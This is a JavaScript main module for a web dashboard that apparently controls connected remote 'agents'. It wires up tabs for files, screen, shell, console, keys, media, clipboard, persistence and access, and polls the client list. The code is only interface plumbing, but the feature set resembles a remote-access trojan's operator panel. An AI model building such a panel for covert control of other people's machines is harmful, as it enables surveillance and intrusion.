import { $, $$ } from "./lib/dom.js";
import { createStore } from "./lib/store.js";
import { api } from "./lib/api.js";
import { initThemePicker } from "./lib/themes.js";
import { createAgentsView } from "./views/agents.js";
import { createFilesView } from "./views/files.js";
import { createScreenView } from "./views/screen.js";
import { createShellView } from "./views/shell.js";
import { createConsoleView } from "./views/console.js";
import { createFunView } from "./views/fun.js";
import { createKeysView } from "./views/keys.js";
import { createMediaView } from "./views/media.js";
import { createClipView } from "./views/clip.js";
import { createPersistView } from "./views/persist.js";
import { createAccessView } from "./views/access.js";

initThemePicker($("#btn-theme"));

const session = await api.session();
document.body.classList.toggle("is-admin", session.role === "admin");

const store = createStore({
  agents: [],
  selectedId: null,
  tab: "files",
  cwd: null,
});

const context = {
  store,
  agentId: () => store.get().selectedId,
};

const views = {
  files: createFilesView($("#tab-files"), context),
  screen: createScreenView($("#tab-screen"), context),
  shell: createShellView($("#tab-shell"), context),
  console: createConsoleView($("#tab-console"), context),
  fun: createFunView($("#tab-fun"), context),
  keys: createKeysView($("#tab-keys"), context),
  media: createMediaView($("#tab-media"), context),
  clip: createClipView($("#tab-clip"), context),
  persist: createPersistView($("#tab-persist"), context),
  access: createAccessView($("#tab-access"), context),
};

const status = $("#status");
const agents = createAgentsView({ root: $("#agents"), store, onSelect: selectAgent });

function syncTabs() {
  const { tab } = store.get();
  $$(".tabs button").forEach((button) => button.classList.toggle("on", button.dataset.tab === tab));
  $$(".panel").forEach((panel) => panel.classList.toggle("on", panel.id === `tab-${tab}`));
}

function setTab(tab) {
  if (tab === store.get().tab) return;
  views[store.get().tab].deactivate();
  store.update(() => ({ tab }));
  syncTabs();
  views[tab].activate();
}

function selectAgent(id) {
  if (id === store.get().selectedId) return;
  views[store.get().tab].deactivate();
  store.update(() => ({ selectedId: id, cwd: null }));
  agents.refresh();
  views[store.get().tab].activate();
}

async function syncAgents() {
  const before = store.get().selectedId;
  await agents.refresh();
  const { agents: list, selectedId } = store.get();
  status.textContent = list.length === 0 ? "no clients" : `${list.length} client${list.length === 1 ? "" : "s"}`;
  if (selectedId !== before) {
    views[store.get().tab].deactivate();
    views[store.get().tab].activate();
  }
}

$$(".tabs button").forEach((button) =>
  button.addEventListener("click", () => setTab(button.dataset.tab)),
);

$("#btn-logout").addEventListener("click", () => {
  api.logout().finally(() => window.location.assign("/login.html"));
});

syncTabs();
syncAgents();
setInterval(syncAgents, 4000);
